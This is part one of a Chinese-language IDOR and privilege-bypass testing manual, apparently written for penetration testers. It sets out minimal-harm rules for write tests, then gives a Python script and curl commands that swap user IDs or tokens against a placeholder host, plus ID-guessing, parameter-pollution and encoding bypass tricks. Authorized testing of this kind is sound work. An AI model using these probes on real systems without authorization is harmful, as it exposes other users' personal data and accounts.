# idor-test · part 1

> 分段 1/3。完整索引见 `idor-test.md`。

## 一、原有知识库

# 越权漏洞（IDOR/权限绕过）测试手册

> **最小伤害：** 默认读/列表差分。写越权要测，按「先加自己的 → 再删自己加的」。不要把「只读」理解成「写 IDOR 不测不报」。

### 写越权怎么打（先加后清）

读差分够闭环就不要写。读不够、要证「能改别人的东西」时：

1. **先测添加。** 用自己的号（或未登录）调创建口，看能不能挂到别人名下 / 别人店 / 别人租户。成功 = 写越权已证。  
2. **再删自己刚加的那一条。** 用同一条接口或对应删除口清掉，别留脏数据。  
3. **不要**去改别人已有订单、改别人密码/角色、删别人原来的地址/券/商品。那些删不干净，也不是最小证伪。  
4. 现场没有创建口、只有改/删现成对象：改一个**自己能改回去**的测试字段，打一次就停。改密 / 改角色 / 改绑按 `../../../../rules/60-scope-iteration.md` §4.2.2 和 `authbypass-test.md` **可探**（拿掉旧验看过不过）；过了立刻改回；改不回就停在回包，不要把别人的密、角色、邮箱留下。  
5. 要证资损：只动**自己能改回去的**测试金额/状态，打一次立刻改回。不要真转走生产资金、不要清别人库存、不要把别人已有单改到收不回。**不是**支付/写 IDOR 不测。禁止批量、禁止对着生产主数据试删。本段是最小伤害，**不是**「写 IDOR / 接管 / 加字段不测」。
## 概念区分

- **水平越权**: 同权限级别，访问他人资源（A 访问 B 的订单）
- **垂直越权**: 低权限账户调用高权限接口（普通用户调管理员 API）
- **未授权访问**: 未登录直接访问需认证接口

---
## 测试流程

### Step 1: 找到用户标识参数

在以下位置寻找用户/资源标识：

```
URL 路径:    /api/user/12345/info
URL 参数:    ?userId=12345&orderId=ABC
请求体:      {"uid": 12345, "target_id": "user_abc"}
响应体中:    {"id": 12345, "created_by": 67890}  ← 收集这些 ID
```

**高价值接口特征**:
- 包含 `user`, `account`, `profile`, `order`, `bill`, `message` 的路径
- 响应包含他人的手机号、邮箱、真实姓名、身份证
- 修改类接口: `update`, `edit`, `delete`, `change`

### Step 2: 对象 id（有两号更好，没有也不磨注册）

```
有对照号：账号 A 登录拿 token，账号 B 的资源 ID 做对照。
单号 / 没号：用列表、回包、邻号、`0`/`-1`/空当他人 id（`../../../../rules/60-scope-iteration.md` §4.2.3）。禁止为凑第二号去磨注册。
```

### Step 3: 替换标识符测试

```python
# 水平越权测试示例
# 用 A 的 token 访问 B 的资源

import requests

token_a = "Bearer eyJ..."
victim_user_id = "B的用户ID"

# 原始请求（访问自己）
r1 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": "A的ID"},
    headers={"Authorization": token_a}
)

# 越权请求（访问 B）
r2 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": victim_user_id},
    headers={"Authorization": token_a}
)

# 对比响应
print("自己:", r1.json())
print("他人:", r2.json())
# 若 r2 成功返回 B 的数据 → 水平越权
```

### Step 4: 垂直越权测试

```bash
# 用普通用户 token 调用管理员接口
# 先在管理员账号下抓包找到管理接口
ADMIN_ENDPOINT="https://target.com/api/admin/users/list"
USER_TOKEN="普通用户的token"

curl -X GET "$ADMIN_ENDPOINT" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json"

# 200 成功 → 垂直越权
# 403 Forbidden → 有权限控制
```

### Step 5: 未授权访问测试

```bash
# 去掉 Authorization 头直接请求
curl -X GET "https://target.com/api/user/info?userId=12345"

# 或替换为无效 token
curl -X GET "https://target.com/api/user/info?userId=12345" \
  -H "Authorization: Bearer invalid_token_123"
```

---
## 常见绕过技巧

### ID 猜测
```
数字 ID: 尝试 ±1, ±10, 0, -1, 999999
列表上的租户/应用字段：换别人真实 ID 拦了，再试 0 / -1 / 空 / 不传（见下「哨兵租户」）
UUID: 可能从响应或 JS 中获取其他用户 UUID
手机号: 某些接口直接用手机号做标识
```

### 参数污染
```
# 同名参数多次提交
POST /api/user/info?userId=A_ID&userId=B_ID
POST body: userId=A_ID   + URL: ?userId=B_ID
```

### 路径遍历
```
/api/user/A_ID/orders  →  /api/user/B_ID/orders
/api/order/123         →  /api/order/124, 125...
```

### 编码绕过
```
userId=12345         → userId=0x3039（16进制）
userId=12345         → userId=%31%32%33%34%35（URL编码）
```

---
